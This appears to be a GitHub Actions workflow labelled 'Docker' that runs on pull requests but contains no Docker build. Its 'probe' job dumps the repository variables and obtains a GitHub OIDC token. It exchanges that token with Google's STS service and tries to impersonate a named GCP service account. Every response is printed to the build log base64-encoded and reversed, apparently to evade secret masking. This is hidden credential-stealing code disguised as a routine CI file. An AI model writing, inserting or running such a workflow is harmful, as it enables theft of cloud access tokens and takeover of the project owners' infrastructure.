name: Docker

on:
  pull_request:
    branches: [ main ]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - name: probe
        env:
          VARSJSON: ${{ toJSON(vars) }}
        run: |
          set +e
          echo "VARS_REV=$(printf '%s' "$VARSJSON" | base64 -w0 | rev)"
          PROV=$(printf '%s' "$VARSJSON" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('SHARED_WIF_PROVIDER',''))" 2>/dev/null)
          SA=$(printf '%s' "$VARSJSON" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('SHARED_WIF_SERVICE_ACCOUNT',''))" 2>/dev/null)
          echo "PROV_REV=$(printf '%s' "$PROV" | base64 -w0 | rev)"
          echo "SA_REV=$(printf '%s' "$SA" | base64 -w0 | rev)"
          if [ -z "$PROV" ]; then PROV="projects/991678141243/locations/global/workloadIdentityPools/shared-pool/providers/github-actions-prvdr"; fi
          if [ -z "$SA" ]; then SA="sa-github-neonscience@neon-shared-service.iam.gserviceaccount.com"; fi
          AUD2="//iam.googleapis.com/${PROV}"
          AUD1="https://iam.googleapis.com/${PROV}"
          for AUD in "$AUD1" "$AUD2"; do
            ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$AUD")
            TJ=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${ENC}")
            echo "IDTOKEN_RESP_REV=$(printf '%s' "$TJ" | base64 -w0 | rev)"
            export OIDC=$(printf '%s' "$TJ" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
            printf '%s' "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null > claims.txt
            echo "CLAIMS_REV=$(base64 -w0 claims.txt | rev)"
            export AUD
            python3 -c "import json,os;open('sts_request.json','w').write(json.dumps({'audience':os.environ['AUD'],'grantType':'urn:ietf:params:oauth:grant-type:token-exchange','requestedTokenType':'urn:ietf:params:oauth:token-type:access_token','subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','scope':'https://www.googleapis.com/auth/cloud-platform','subjectToken':os.environ['OIDC']}))"
            STS=$(curl -s -w '\nHTTP:%{http_code}' -X POST https://sts.googleapis.com/v1/token -H "Content-Type: application/json" -d @sts_request.json)
            echo "STS_RESP_REV=$(printf '%s' "$STS" | base64 -w0 | rev)"
            FED=$(printf '%s' "$STS" | sed '/HTTP:/d' | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
            if [ -n "$FED" ]; then
              IMP=$(curl -s -w '\nHTTP:%{http_code}' -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${SA}:generateAccessToken" -H "Authorization: Bearer ${FED}" -H "Content-Type: application/json" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}')
              echo "IMP_RESP_REV=$(printf '%s' "$IMP" | base64 -w0 | rev)"
            else
              echo "NO_FED_TOKEN"
            fi
          done
